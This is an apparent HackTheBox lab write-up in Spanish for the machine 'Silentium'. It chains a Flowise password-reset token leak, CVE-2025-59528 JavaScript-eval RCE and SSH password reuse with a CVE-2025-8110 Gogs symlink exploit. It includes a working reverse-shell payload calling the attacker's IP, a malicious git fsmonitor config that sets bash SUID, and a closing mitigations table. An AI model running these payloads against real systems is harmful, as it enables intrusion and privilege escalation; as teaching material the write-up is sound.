---
title: "HackTheBox — Silentium"
date: 2026-04-12
draft: false
description: "Writeup de Silentium (HTB Easy): IDOR en Flowise reset password → CVE-2025-59528 (JS eval RCE) → reutilización de credenciales SSH → CVE-2025-8110 (Gogs symlink + fsmonitor SUID bash)."
tags: ["HackTheBox", "Easy", "Linux", "Flowise", "IDOR", "RCE", "Docker", "Gogs", "Symlink", "SUID", "CVE-2025-59528", "CVE-2025-8110", "PasswordReuse", "PortForwarding"]
categories: ["HackTheBox"]
---

{{< lead >}}
Máquina Linux de dificultad fácil. El camino completo pasa por: IDOR en el endpoint de reset de contraseña de **Flowise** que expone el `tempToken` en la respuesta → **CVE-2025-59528** (eval de JavaScript en el endpoint `customMCP`) para RCE dentro de un contenedor Docker → credenciales SMTP en variables de entorno reutilizadas en SSH → **CVE-2025-8110** en **Gogs 0.13.0** (symlink + directiva `fsmonitor`) para poner el bit SUID en `/usr/bin/bash`.
{{< /lead >}}

**IP:** `10.129.17.219` · **SO:** Ubuntu 24.04 LTS · **Dificultad:** Fácil

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.17.219
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -sC -sV -p22,80 10.129.17.219
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

Superficie de ataque mínima — solo SSH y una web en nginx. Añadimos `silentium.htb` a `/etc/hosts`.

---

## 2. Enumeración Web

### Página principal

La web es una landing page corporativa de una firma financiera ficticia. En la sección de equipo ("Leadership") encontramos tres nombres:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems *(sin apellido)*
- **Elena Rossi** — Chief Risk Officer

Ben es el único miembro sin apellido. Su nombre de usuario probablemente sea simplemente `ben`.

### Virtual Host Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs 178
```

```
staging    [Status: 200, Size: 3142, Duration: 54ms]
```

Añadimos `staging.silentium.htb` a `/etc/hosts`. Al visitarlo encontramos una instancia de **Flowise** — plataforma open-source para construir agentes de IA visualmente.

---

## 3. IDOR en el Reset de Contraseña de Flowise

### Identificación de la versión y estado de vulnerabilidad

```
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> check

[*] Flowise version detected: 3.0.5
[+] The target appears to be vulnerable. (affected: >= 2.2.7-patch.1 and < 3.0.6) (auth required)
```

La versión **3.0.5** es vulnerable, pero el exploit requiere credenciales. Necesitamos autenticarnos primero.

### Análisis del flujo de reset

Inspeccionando el JavaScript del frontend encontramos la vista de "Forgot Password":

```
http://staging.silentium.htb/assets/forgotPassword-Dt6O5dqm.js
```

El flujo de reset llama a `/api/v1/account/forgot-password`. La vulnerabilidad: **la respuesta devuelve el `tempToken` directamente en el JSON**, sin enviarlo solo por correo — un IDOR clásico.

**Paso 1 — Solicitar el reset para `ben@silentium.htb`:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
    "tokenExpiry": "2026-04-11T21:02:58.455Z",
    "status": "active"
  }
}
```

El token aparece en la respuesta. Normalmente solo llegaría al email del usuario.

**Paso 2 — Usar el token para establecer contraseña nueva:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
      "password": "1234.Abcd"
    }
  }'
```

```json
{"user": {"email": "ben@silentium.htb", "tempToken": "", "status": "active"}}
```

✅ **Credenciales:** `ben@silentium.htb : 1234.Abcd`

---

## 4. CVE-2025-59528 — Flowise JS RCE

### Explotación con Metasploit

```bash
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> set LHOST tun0
[msf] >> set FLOWISE_EMAIL ben@silentium.htb
[msf] >> set FLOWISE_PASSWORD 1234.Abcd
[msf] >> run
```

```
[*] Flowise version detected: 3.0.5
[+] Authentication successful
[*] Sending stage (3090404 bytes) to 10.129.17.219
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.17.219:57642)
```

Estamos dentro, pero **en un contenedor Docker** (confirma `/.dockerenv`).

### Explotación manual — Endpoint `customMCP`

El endpoint `/api/v1/node-load-method/customMCP` acepta una cadena como configuración de servidor MCP que se evalúa como JavaScript en el servidor Node.js sin sanitización. Desde la consola del navegador con la sesión iniciada en Flowise:

```javascript
fetch('/api/v1/node-load-method/customMCP', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'x-request-from': 'internal'
  },
  body: JSON.stringify({
    loadMethod: "listActions",
    inputs: {
      mcpServerConfig: "({x:(function(){const cp = process.mainModule.require('child_process'); cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.237 4444 >/tmp/f'); return 1;})()})"
    }
  })
}).then(res => res.json()).then(console.log);
```

Con `nc -lvnp 4444` activo obtenemos shell en el contenedor. Inspeccionamos las variables de entorno:

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SMTP_HOST=mailhog
SMTP_PORT=1025
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
```

Credenciales de interés: `ben` / `r04D!!_R4ge` (SMTP).

---

## 5. Acceso SSH — User Flag

```bash
ssh ben@10.129.17.219
# Password: r04D!!_R4ge
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
```

✅ La contraseña SMTP se reutilizó en el sistema host.

```bash
ben@silentium:~$ cat user.txt
50615873f0b476a96d3eb1bb5b0775fb
```

---

## 6. Escalada de Privilegios — CVE-2025-8110 (Gogs Symlink)

### Descubrimiento de servicios internos

```bash
ben@silentium:~$ netstat -tulpn | grep 127.0.0.1
```

```
tcp  0  0  127.0.0.1:3000   0.0.0.0:*  LISTEN  -   ← Flowise
tcp  0  0  127.0.0.1:3001   0.0.0.0:*  LISTEN  -   ← Gogs
tcp  0  0  127.0.0.1:8025   0.0.0.0:*  LISTEN  -   ← MailHog (UI)
tcp  0  0  127.0.0.1:1025   0.0.0.0:*  LISTEN  -   ← MailHog (SMTP)
```

El puerto **3001** aloja **Gogs 0.13.0** — vulnerable a **CVE-2025-8110**, que permite sobreescribir archivos arbitrarios del sistema mediante un symlink malicioso en un repositorio Git.

### Port forwarding

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.17.219
```

Accedemos a `http://127.0.0.1:3001`. Registramos el usuario `tester`.

### ¿Cómo funciona CVE-2025-8110?

Gogs no valida correctamente los symlinks dentro de los repositorios Git. Si subimos un symlink que apunta a `.git/config` y luego usamos la API de Gogs para escribir contenido a través de ese symlink, sobreescribimos el `.git/config` real del repositorio en el servidor. Cuando Gogs procesa un `push` posterior, Git lee ese config y ejecuta el comando especificado en la directiva `fsmonitor`.

### Preparar el repositorio con el symlink

```bash
ben@silentium:/tmp$ mkdir pwn_local && cd pwn_local
ben@silentium:/tmp/pwn_local$ git init

# Symlink que apunta a .git/config
ben@silentium:/tmp/pwn_local$ ln -s .git/config evil_link

ben@silentium:/tmp/pwn_local$ git add evil_link
ben@silentium:/tmp/pwn_local$ git commit -m "Add symlink"
```

Crear el repositorio `pwn` vacío en Gogs desde la interfaz web, luego subir:

```bash
ben@silentium:/tmp/pwn_local$ git remote add origin http://127.0.0.1:3001/tester/pwn.git
ben@silentium:/tmp/pwn_local$ git push origin master
```

### Escribir el config malicioso a través de la API

La directiva `fsmonitor` de `.git/config` especifica un comando que Git ejecuta al procesar el repositorio. Lo usamos para activar el bit SUID en `/usr/bin/bash`:

```bash
cat << EOF > exploit_config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    fsmonitor = "chmod +s /usr/bin/bash"
EOF

PAYLOAD=$(base64 -w 0 < exploit_config)

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/tester/pwn/contents/evil_link" \
  -H "Authorization: token 36a4fbd1b1d0343a8cf4a7efb41a6314a0662489" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\", \"content\":\"$PAYLOAD\"}"
```

Al escribir a través del symlink `evil_link`, Gogs sobreescribe `.git/config` del repositorio en el servidor con nuestro contenido malicioso.

### Disparar la ejecución del `fsmonitor`

```bash
ben@silentium:/tmp/pwn_local$ git commit --allow-empty -m "trigger"
ben@silentium:/tmp/pwn_local$ git push origin master
```

Cuando Gogs procesa el push, Git lee el config modificado y ejecuta `chmod +s /usr/bin/bash` con los privilegios del proceso de Gogs (root).

### Obtener root

```bash
ben@silentium:/tmp/pwn_local$ ls -l /usr/bin/bash
-rwsrwsrwx 1 root root 1446024 Mar 31 2024 /usr/bin/bash
```

```bash
ben@silentium:/tmp/pwn_local$ bash -p
```

> **`-p`:** El flag "privilegiado" impide que bash descarte el EUID al inicio. Sin él, bash ignoraría el bit SUID por seguridad.

```
bash-5.2# id
uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root) groups=0(root)
```

---

## 7. Root Flag

```bash
bash-5.2# cat /root/root.txt
53d486260b78a07715cbd3d9eaec756f
```

---

## 8. Cadena de Ataque

```
staging.silentium.htb → Flowise 3.0.5
         ↓
IDOR en /api/v1/account/forgot-password → tempToken en respuesta JSON
         ↓
Reset contraseña ben@silentium.htb → Acceso al dashboard Flowise
         ↓
CVE-2025-59528 (JS eval en /api/v1/node-load-method/customMCP) → RCE en contenedor Docker
         ↓
env → SMTP_PASSWORD: r04D!!_R4ge
         ↓
SSH como ben (reutilización de contraseña) → user.txt
         ↓
Gogs 0.13.0 en puerto 3001 → CVE-2025-8110 (symlink + fsmonitor)
         ↓
chmod +s /usr/bin/bash → bash -p → euid=0(root) → root.txt
```

---

## 9. Mitigaciones

| Vector | Mitigación |
|---|---|
| IDOR reset de contraseña | Nunca devolver el `tempToken` en el body — enviarlo **solo** por email |
| CVE-2025-59528 (JS eval) | Actualizar Flowise ≥ 3.0.6; no evaluar input del usuario como código |
| Credenciales en variables de entorno | Usar secret managers (Vault, AWS Secrets Manager) |
| Reutilización de contraseña SMTP/SSH | Contraseña única por servicio |
| CVE-2025-8110 (Gogs symlink) | Actualizar Gogs; no ejecutar el servicio como root |
| `fsmonitor` sin restricción | Configurar `safe.directory`; deshabilitar fsmonitor en entornos de servidor |
